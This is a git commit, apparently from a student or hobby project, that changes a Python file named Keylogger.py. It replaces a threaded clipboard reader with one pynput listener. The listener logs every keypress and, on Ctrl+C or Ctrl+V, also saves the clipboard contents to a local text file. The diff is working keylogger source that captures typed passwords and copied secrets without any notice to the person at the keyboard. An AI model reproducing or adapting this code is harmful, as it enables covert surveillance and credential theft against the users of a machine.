675caf2bfe528f852d6e28279e4bf6196b87cc55
Christopher liang <z5492103@ad.unsw.edu.au>
2023-10-30 05:03:36 +1100

    Finally added clipboard reaeder

--- Keylogger.py
+++ Keylogger.py
@@ -4,53 +4,36 @@ import pyperclip
 import time
 import threading
 
-oldClipboard = ''
+
+
 
 def printKeyPress(key):
-    print(str(key))
-    # with open("recording.txt", mode='a') as f:
-        # f.write(str(key))
-        # f.write('\n')
-        # f.close()
-
-def shortcutsPressed():
-    with open("recording.txt", mode='a') as f:
-        global oldClipboard
-
-        # win32clipboard.OpenClipboard()
-        # data = str(win32clipboard.GetClipboardData())
-        # win32clipboard.CloseClipboard()
-
-        data = pyperclip.paste()
-
-        print("asdadsad: {a}".format(a = data))
-        print("asdadsad: {a}".format(a = oldClipboard))
-        print(data == oldClipboard)
-        while (data == oldClipboard):
-            # win32clipboard.OpenClipboard()
-            # data = str(win32clipboard.GetClipboardData())
-            # win32clipboard.CloseClipboard()
-
-            data = pyperclip.paste()
-
-            oldClipboard == data
-
-        print(data)
-        print(oldClipboard)
-
-def readKeyboardInput():
-    global oldClipboard
-    with keyboard.Listener(on_press=printKeyPress) as listener:
-        listener.join()
-
-def readClipboard():
-    global oldClipboard
-    with keyboard.GlobalHotKeys({'<ctrl>+c' : shortcutsPressed}) as h:
-        h.join()
-    # hotkey = keyboard.HotKey(keyboard.HotKey.parse('<ctrl>+c'), shortcutsPressed)
     
 
-threading.Thread(target = readKeyboardInput, name ='keyboardReader', daemon= False).start()
-threading.Thread(target = readClipboard, name = 'clipboardReader', daemon= True).start()
+    # if any((keyPressed in current) for keyPressed in COMBINATION):
+    if (key == keyboard.KeyCode(char = '\x03') or key == keyboard.KeyCode(char = '\x16')):
+        oldclip = pyperclip.paste() 
+        data = pyperclip.paste()
+
+        if oldclip == data:
+            try:
+                pyperclip.waitForNewPaste(0.1)
+            except pyperclip.PyperclipTimeoutException:
+                pass
+            data = pyperclip.paste()
+        
+        with open("recorcording.txt", mode='a') as f:
+            f.write(data)
+            f.write('\n')
+            f.close()
+        print(data)
+    else:
+        with open("recorcording.txt", mode='a') as f:
+            f.write(str(key))
+            f.write('\n')
+            f.close()
+
+with keyboard.Listener(on_press=printKeyPress) as Listener:
+    Listener.join()
 
 
